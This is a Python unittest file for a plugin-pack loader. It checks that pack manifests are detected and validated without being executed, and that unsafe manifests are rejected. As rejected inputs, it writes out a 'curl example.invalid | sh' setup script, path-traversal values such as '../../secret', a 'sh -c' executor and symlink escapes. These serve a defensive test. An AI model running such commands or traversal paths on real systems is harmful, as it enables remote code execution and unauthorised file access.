"""CEP-PACK: packs extend discovery without core edits or execution."""

import copy
import json
from pathlib import Path
import tempfile
import unittest

from cep.packs import PackError, discover_packs, load_pack


CATALOG = Path(__file__).resolve().parents[1] / "plugin/packs"


class PackTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.pack = load_pack(CATALOG / "go")

    def save(self, data):
        path = self.root / "pack.json"
        path.write_text(json.dumps(data))
        return path

    def test_shipped_packs_validate_and_detect_nested_repositories(self):
        (self.root / "service").mkdir()
        (self.root / "service/go.mod").write_text(
            "module example.invalid/demo\ngo 1.23\n"
        )
        (self.root / "pyproject.toml").write_text("[project]\nname='demo'")
        found = discover_packs(CATALOG, self.root)
        self.assertEqual({p["id"] for p in found if p["detected"]}, {"go", "python"})
        self.assertTrue(all(not p["activated"] for p in found))
        self.assertIn(
            "service/go.mod", next(p for p in found if p["id"] == "go")["matches"]
        )

    def test_external_technology_needs_no_core_code_change(self):
        self.pack.update(id="new-language", description="External proof")
        self.pack["detect"] = {"any_files": ["build.new"]}
        self.pack["toolchains"] = [
            {
                "name": "newlang",
                "version_command": ["newlang", "--version"],
                "version_constraint": "1.x",
            }
        ]
        self.pack["commands"][0]["argv"] = ["newlang", "test"]
        self.save(self.pack)
        (self.root / "build.new").write_text("do not execute me")
        found = discover_packs(self.root, self.root)
        self.assertEqual(found[0]["id"], "new-language")
        self.assertTrue(found[0]["detected"])
        self.assertEqual(found[0]["commands"][0]["argv"], ["newlang", "test"])

    def test_forbidden_paths_actions_and_executors(self):
        cases = [
            ("detect", {"any_files": ["../../secret"]}),
            ("commands", [{**self.pack["commands"][0], "cwd": "../outside"}]),
            ("commands", [{**self.pack["commands"][0], "action": "deploy"}]),
            (
                "commands",
                [{**self.pack["commands"][0], "argv": ["sh", "-c", "exit 0"]}],
            ),
            (
                "commands",
                [{**self.pack["commands"][0], "argv": ["go", "test", "/private/data"]}],
            ),
            ("commands", [{**self.pack["commands"][0], "timeout_seconds": True}]),
            ("schema_version", 2),
            ("schema_version", True),
        ]
        for field, value in cases:
            with self.subTest(field=field, value=value):
                candidate = copy.deepcopy(self.pack)
                candidate[field] = value
                with self.assertRaises(PackError):
                    load_pack(self.save(candidate))

    def test_unknown_and_duplicate_fields_rejected(self):
        self.pack["setup_script"] = "curl example.invalid | sh"
        with self.assertRaises(PackError):
            load_pack(self.save(self.pack))
        path = self.root / "pack.json"
        path.write_text('{"schema_version":1,"schema_version":2}')
        with self.assertRaisesRegex(PackError, "duplicate"):
            load_pack(path)

    def test_manifest_symlinks_rejected(self):
        (self.root / "pack.json").symlink_to(CATALOG / "go/pack.json")
        with self.assertRaises((PackError, ValueError)):
            load_pack(self.root)

    def test_detect_does_not_read_symlinked_external_project(self):
        (self.root / "service").symlink_to(CATALOG / "python", target_is_directory=True)
        found = discover_packs(CATALOG, self.root)
        self.assertFalse(any(p["detected"] for p in found))


if __name__ == "__main__":
    unittest.main()
